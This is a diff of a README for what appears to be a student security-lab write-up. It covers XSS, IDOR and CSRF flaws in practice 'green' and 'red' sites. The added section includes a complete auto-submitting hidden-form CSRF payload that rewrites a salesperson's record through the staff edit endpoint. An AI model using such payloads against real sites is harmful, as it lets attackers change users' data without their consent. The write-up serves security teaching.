@@ -37,6 +37,7 @@ This vulnerability is on the Login page for the green website. The mistake the d
 GIF Walkthrough: <img src="green1.gif" width="900">
 
 Vulnerability #2: Cross-Site Scripting:
+
 On the contact page where users can leave feedback, the user has the ability to execute an XSS attack by injecting JavaScript into the name input of the form. In the walkthrough, I show how an alert injected by a public user can be executed when a staff member reviews the feedback. The browser on the left shows the attacker's perspective and the one on the right shows the target's perspective. 
 
 
@@ -44,24 +45,30 @@ GIF Walkthrough: <img src="green2.gif" width="900">
 
 ## Red
 
-Vulnerability #1: Insecure Direct Object Reference (IDOR):
-* The ID of a person can be seen in the URL and can be changed to access the files of vissible and non vissible information.
+Vulnerability #1: Indirect Object Reference:
 
-#####ADD GIF HERE
+Under staff information, each staff member's profile is identified by their ID, which is visible in the URL. In the red page, the user can simply change the ID to that of any person who is in the salesperson, even those who are not supposed to be visible (such as Lazy Lazyman who was fired). While the other versions of the site redirect the user to the salesperson directory when changing the ID to that of a salesperson who is not listed on the public site, the red version still shows the non-public salesperson's profile. In the walkthrough, this is demonstrated by changing the ID to that of Lazy Lazyman (11). 
+
+GIF Walkthrough: <img src="red1.gif" width="900">
 
 Vulnerability #2: Cross-Site Request Forgery (CSRF): 
-* When using an html file ("coolbeans.html" in this github)  you can change the information of a person based on a specific web address. The attacker just needs to convince the user to open the file.
 
-#####ADD GIF HERE
+Since the red site does not have CSRF protections on the staff area, an attacker can design a form that can submit data to a part of the website that requires admin access. In this walkthrough example, I show how an attacker can link a hidden form in their feedback that submits data to the edit page for a particular salesperson (in this case, Ken Barker). When the admin follows the link, they unknowingly submit the form. The last name of the employee is changed to 'BARK BARK....WHO LET THE DOGS OUT' as a result.
 
-## Bonus: 
-Green- XSS: 
-* You can use the same technique as before to redirect the user to a different page. In this case i redirected the user to youtube, but it can be used to redirect the user to a malicious. 
+This is the HTML code for the form:
+```
+<html>
+  <body onload="document.hiddenForm.submit()">
+    <form name="hiddenForm" style="display:none" action="https://104.198.208.81/red/public/staff/salespeople/edit.php?id=5" target="target" method="post">
+      <input type="text" name="first_name" value="Ken" />
+      <input type="text" name="last_name" value="BARK BARK....WHO LET THE DOGS OUT" />
+      <input type="text" name="phone" value="555-352-9654" />
+      <input type="text" name="email" value="kbarker@salesperson.com" />
+    </form>
+    <iframe name="target" style="display:none" ></iframe>
+  </body>
+</html>
+```
 
+GIF Walkthrough: <img src="red2.gif" width="900">
 
-#####ADD GIF HERE
-
-
-## Notes
-
-Describe any challenges encountered while doing the work
